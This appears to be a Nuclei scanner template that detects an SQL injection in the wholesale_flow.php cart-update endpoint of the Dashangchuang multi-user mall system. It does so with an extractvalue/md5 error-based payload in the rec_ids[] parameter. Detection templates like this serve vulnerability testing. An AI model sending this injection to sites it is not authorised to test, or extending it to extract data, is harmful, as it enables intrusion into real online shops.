id: dashang-wholesale-sqli
info:
  name: 大商创多用户商城系统-wholesale_flow-sql注入漏洞
  author: apple
  severity: high
  description: 大商创多用户商城系统-wholesale_flow-sql注入漏洞
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /wholesale_flow.php?step=ajax_update_cart HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 45

        rec_ids[]=extractvalue(1,concat(0x7e,md5(1)))
    matchers:
      - type: word
        part: body
        words:
          - c4ca4238a0b923820dcc509a6f75849
